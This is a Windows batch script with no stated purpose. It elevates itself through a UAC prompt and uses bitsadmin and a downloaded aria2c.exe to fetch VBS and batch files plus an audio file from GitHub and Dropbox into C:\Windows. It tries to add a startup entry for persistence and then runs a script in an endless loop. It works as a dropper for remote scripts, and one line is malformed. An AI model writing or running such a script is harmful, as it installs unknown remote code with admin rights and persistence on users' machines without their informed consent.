@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
if "%1"=="h" goto begin
bitsadmin /transfer debjob /download /priority normal https://github.com/JamieJiami/Aria2c/raw/main/aria2c.exe c:\windows\aria2c.exe
c:\windows\aria2c.exe https://www.dropbox.com/s/2gfnwdolauoez8p/music.mp3?dl=1
move music.mp3 c:\windows\music.mp3
c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/music.vbs
move music.vbs c:\windows\music.vbs
c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/startup.bat
move startup.bat c:\windows\startup.bat
c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/statup.vbs
move statup"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.vbs"
:1
c:\windows\music.vbs
goto 1